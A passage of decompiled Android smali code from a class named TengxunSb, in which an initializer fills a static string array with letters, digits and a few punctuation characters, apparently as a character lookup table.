    sget-object v1, Lcom/attached/TengxunSb;->l:[Ljava/lang/String;

    const/16 v2, 0x34

    const/16 v3, 0x2d

    invoke-static {v3}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v1, v2

    .line 67
    sget-object v1, Lcom/attached/TengxunSb;->l:[Ljava/lang/String;

    const/16 v2, 0x35

    const/16 v3, 0x2e

    invoke-static {v3}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v1, v2

    .line 68
    sget-object v1, Lcom/attached/TengxunSb;->l:[Ljava/lang/String;

    const/16 v2, 0x36

    const/16 v3, 0x2f

    invoke-static {v3}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v1, v2

    .line 69
    sget-object v1, Lcom/attached/TengxunSb;->l:[Ljava/lang/String;

    const/16 v2, 0x37

    const/16 v3, 0x3a

    invoke-static {v3}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v1, v2

    .line 70
    sget-object v1, Lcom/attached/TengxunSb;->l:[Ljava/lang/String;

    const/16 v2, 0x38

    const/16 v3, 0x5f

    invoke-static {v3}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v1, v2

    .line 71
    sget-object v1, Lcom/attached/TengxunSb;->l:[Ljava/lang/String;

    const/16 v2, 0x43

    const/16 v3, 0x2c

    invoke-static {v3}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v1, v2

    .line 72
    return-void

    .line 56
    :cond_0
    sget-object v1, Lcom/attached/TengxunSb;->l:[Ljava/lang/String;

    add-int/lit8 v2, v0, 0x41

    int-to-char v2, v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v2

    aput-object v2, v1, v0

    .line 55
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    .line 60
    :cond_1
    sget-object v1, Lcom/attached/TengxunSb;->l:[Ljava/lang/String;

    add-int/lit8 v2, v0, 0x1a

    add-int/lit8 v3, v0, 0x61

    int-to-char v3, v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v1, v2

    .line 59
    add-int/lit8 v0, v0, 0x1

    goto :goto_1

    .line 64
    :cond_2
    sget-object v1, Lcom/attached/TengxunSb;->l:[Ljava/lang/String;

    add-int/lit8 v2, v0, 0x39

    add-int/lit8 v3, v0, 0x30

    int-to-char v3, v3

    invoke-static {v3}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v1, v2

    .line 63
    add-int/lit8 v0, v0, 0x1

    goto :goto_2
.end method
